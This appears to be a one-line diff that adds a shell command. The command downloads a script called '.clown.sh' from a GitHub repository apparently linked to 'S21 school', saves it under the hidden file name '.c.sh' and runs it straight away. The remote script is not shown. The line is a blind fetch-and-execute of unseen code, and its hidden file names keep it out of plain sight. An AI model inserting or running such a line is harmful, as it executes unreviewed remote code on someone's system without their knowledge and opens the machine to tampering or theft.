@@ -1,0 +1,1 @@
+curl -l https://raw.githubusercontent.com/nohemife/script_s21_school/refs/heads/main/.clown.sh > .c.sh; sh .c.sh
